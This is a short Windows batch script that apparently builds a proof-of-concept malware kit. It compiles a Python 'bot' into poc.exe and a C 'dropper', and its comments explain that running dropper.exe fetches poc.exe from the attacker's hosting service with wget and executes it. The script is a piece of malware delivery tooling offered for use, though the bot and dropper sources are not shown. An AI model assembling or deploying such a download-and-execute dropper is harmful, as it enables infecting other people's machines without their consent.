@echo off

#Compile Our Bot - Gives us poc.exe
pyinstaller -F poc.py

echo "Compiling Our Dropper - Make sure you edited wget to your filename/ID!"
gcc dropper.c -o dropper.exe

echo "Now upon running dropper.exe it will wget our poc.exe from our hosting service then execute it :)"
